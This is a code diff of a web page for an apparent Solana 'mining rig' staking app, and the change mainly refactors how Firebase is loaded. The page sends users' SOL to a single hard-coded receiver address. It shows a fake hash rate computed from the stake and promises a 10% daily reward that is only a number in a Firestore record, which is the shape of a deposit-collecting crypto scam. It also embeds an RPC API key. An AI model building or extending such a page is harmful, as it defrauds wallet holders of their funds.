@@ -56,14 +56,12 @@
             padding: var(--spacing-md);
         }
 
-        /* Main container - fully fluid */
         .mining-app {
             width: 100%;
             max-width: 1200px;
             margin: 0 auto;
         }
 
-        /* Glass panel with dynamic sizing */
         .glass-panel {
             width: 100%;
             background: rgba(5, 20, 30, 0.35);
@@ -77,7 +75,6 @@
                         0 0 40px rgba(0, 255, 255, 0.1);
         }
 
-        /* Animated header */
         .mining-header {
             text-align: center;
             margin-bottom: var(--spacing-xl);
@@ -108,7 +105,6 @@
             letter-spacing: 1px;
         }
 
-        /* Wallet section - fully responsive */
         .wallet-section {
             background: var(--card-bg);
             border-radius: var(--border-radius-lg);
@@ -183,7 +179,6 @@
             color: #00ffaa;
         }
 
-        /* Button styles - touch optimized */
         .btn {
             background: rgba(0, 150, 255, 0.15);
             border: 1px solid rgba(0, 255, 255, 0.4);
@@ -223,7 +218,6 @@
             font-size: var(--font-size-lg);
         }
 
-        /* Stats grid - fully responsive */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(min(100%, 180px), 1fr));
@@ -269,7 +263,6 @@
             margin-top: var(--spacing-xs);
         }
 
-        /* Mining power bar */
         .mining-power-card {
             background: rgba(0, 15, 25, 0.8);
             border-radius: var(--border-radius-lg);
@@ -307,7 +300,6 @@
             box-shadow: 0 0 20px cyan;
         }
 
-        /* Tier and boost section */
         .tier-container {
             display: flex;
             justify-content: space-between;
@@ -347,7 +339,6 @@
             50% { text-shadow: 0 0 20px gold; }
         }
 
-        /* Stake input area */
         .stake-container {
             margin: var(--spacing-lg) 0;
         }
@@ -428,7 +419,6 @@
             background: rgba(0, 200, 255, 0.3);
         }
 
-        /* Live feed */
         .feed-container {
             background: rgba(0, 0, 0, 0.4);
             border-radius: var(--border-radius-lg);
@@ -496,7 +486,6 @@
         .feed-item .info { color: var(--accent-cyan); }
         .feed-item .warning { color: #ff6b6b; }
 
-        /* Modal - fully responsive */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -569,7 +558,6 @@
             gap: var(--spacing-md);
         }
 
-        /* Footer */
         .app-footer {
             margin-top: var(--spacing-lg);
             text-align: center;
@@ -577,7 +565,6 @@
             font-size: var(--font-size-xs);
         }
 
-        /* Utility classes */
         .text-gradient {
             background: linear-gradient(135deg, #00ffff, #0088ff);
             -webkit-background-clip: text;
@@ -749,9 +736,11 @@
         </div>
     </div>
 
-    <!-- Solana Web3 and Buffer -->
+    <!-- Solana Web3 and Firebase -->
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
 
     <script>
         // Initialize Buffer globally
@@ -768,13 +757,16 @@
             appId: "1:111451913127:web:8cb6c4f1715daf0ff69482"
         };
 
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
         // Global variables
         let phantom = null;
         let walletAddress = null;
         let userDocRef = null;
         let miningInterval = null;
         let feedItems = [];
-        let db = null;
 
         const RECEIVER_ADDRESS = "AMC3gY5qJxxF6sNcPzzsmFvpucJJvBydLCiZggaJyeJc";
         const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=a6328d07-7441-42c2-afb0-3bcd6a932c17";
@@ -806,22 +798,6 @@
         const quickStake1 = document.getElementById('quickStake1');
         const quickStake5 = document.getElementById('quickStake5');
         const quickStake10 = document.getElementById('quickStake10');
-
-        // Initialize Firebase
-        async function initFirebase() {
-            try {
-                const { initializeApp } = await import('https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js');
-                const { getFirestore, doc, setDoc, getDoc, updateDoc, serverTimestamp } = await import('https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js');
-                
-                const fbApp = initializeApp(firebaseConfig);
-                db = getFirestore(fbApp);
-                
-                return { doc, setDoc, getDoc, updateDoc, serverTimestamp };
-            } catch (error) {
-                console.error('Firebase initialization error:', error);
-                return null;
-            }
-        }
 
         // Helper Functions
         function showModal(title, detail) {
@@ -913,24 +889,26 @@
             // Hash rate
             const hashRate = Math.round(totalStaked * 1000);
             hashRateSpan.innerHTML = `⚡ ${hashRate.toLocaleString()} H/s`;
+            
+            // Daily reward
+            const dailyReward = totalStaked * 0.1 * tierInfo.boost;
+            dailyRewardSpan.innerText = dailyReward.toFixed(4);
         }
 
         // Firebase Functions
         async function loadUserData(address) {
-            if (!address || !db) return null;
-            
-            const { doc, getDoc, setDoc, serverTimestamp } = await import('https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js');
+            if (!address) return null;
             
             const docId = address;
-            userDocRef = doc(db, 'stakes', docId);
+            userDocRef = db.collection('stakes').doc(docId);
             
             try {
-                const snap = await getDoc(userDocRef);
+                const doc = await userDocRef.get();
                 
-                if (snap.exists()) {
+                if (doc.exists) {
                     console.log('Found existing user data');
                     addToFeed('📊 loaded existing mining data', 'info');
-                    return snap.data();
+                    return doc.data();
                 } else {
                     console.log('No existing data, creating new user');
                     const now = Date.now();
@@ -938,10 +916,10 @@
                         wallet: address,
                         totalStaked: 0,
                         lastDailyUpdate: now,
-                        createdAt: serverTimestamp()
+                        createdAt: firebase.firestore.FieldValue.serverTimestamp()
                     };
                     
-                    await setDoc(userDocRef, newData);
+                    await userDocRef.set(newData);
                     addToFeed('🚀 new mining rig deployed', 'success');
                     return newData;
                 }
@@ -952,10 +930,9 @@
             }
         }
 
+        // Calculate and apply daily rewards
         async function calculateDailyRewards(currentData) {
-            if (!currentData || !userDocRef || !db) return null;
-            
-            const { updateDoc } = await import('https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js');
+            if (!currentData || !userDocRef) return null;
             
             const now = Date.now();
             const lastUpdate = currentData.lastDailyUpdate || now;
@@ -971,7 +948,7 @@
                 }
                 
                 // Update in Firestore
-                await updateDoc(userDocRef, {
+                await userDocRef.update({
                     totalStaked: total,
                     lastDailyUpdate: now
                 });
@@ -984,40 +961,34 @@
             return currentData;
         }
 
+        // Refresh UI with latest data
         async function refreshUserStats() {
-            if (!userDocRef || !walletAddress || !db) return;
+            if (!userDocRef || !walletAddress) return;
             
-            const { getDoc } = await import('https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js');
+            const doc = await userDocRef.get();
+            if (!doc.exists) return;
             
-            const snap = await getDoc(userDocRef);
-            if (!snap.exists()) return;
-            
-            const data = snap.data();
+            const data = doc.data();
             const total = data.totalStaked || 0;
             const last = data.lastDailyUpdate ? new Date(data.lastDailyUpdate).toLocaleString() : 'just now';
             
-            const tierInfo = calculateTier(total);
-            const dailyReward = total * 0.1 * tierInfo.boost;
-            
             totalStakedSpan.innerText = total.toFixed(4);
-            dailyRewardSpan.innerText = dailyReward.toFixed(4);
             lastUpdateSpan.innerText = last;
             
             updateMiningStats(total);
         }
 
+        // Add stake and update Firestore
         async function addStakeToFirestore(amountSol, txid) {
-            if (!userDocRef || !walletAddress || !db) return;
+            if (!userDocRef || !walletAddress) return;
             
-            const { getDoc, updateDoc } = await import('https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js');
+            const doc = await userDocRef.get();
+            if (!doc.exists) return;
             
-            const snap = await getDoc(userDocRef);
-            if (!snap.exists()) return;
-            
-            const currentTotal = snap.data().totalStaked || 0;
+            const currentTotal = doc.data().totalStaked || 0;
             const newTotal = currentTotal + amountSol;
             
-            await updateDoc(userDocRef, {
+            await userDocRef.update({
                 totalStaked: newTotal,
                 lastDailyUpdate: Date.now(),
                 lastTransaction: txid
@@ -1027,7 +998,7 @@
             addToFeed(`📦 +${amountSol} SOL added to mining rig`, 'success');
         }
 
-        // FIXED: Send stake transaction with proper confirmation
+        // Send stake transaction with proper confirmation
         async function sendStakeTransaction(amountSol) {
             if (!phantom || !walletAddress) {
                 alert("Connect Phantom first");
@@ -1168,9 +1139,6 @@
                 const resp = await phantom.connect();
                 walletAddress = resp.publicKey.toString();
                 
-                // Initialize Firebase first
-                await initFirebase();
-                
                 // Load existing data or create new
                 const userData = await loadUserData(walletAddress);
                 
@@ -1239,9 +1207,6 @@
             phantom = getPhantom();
             if (phantom?.isConnected && phantom.publicKey) {
                 walletAddress = phantom.publicKey.toString();
-                
-                // Initialize Firebase
-                await initFirebase();
                 
                 // Load existing data or create new
                 const userData = await loadUserData(walletAddress);
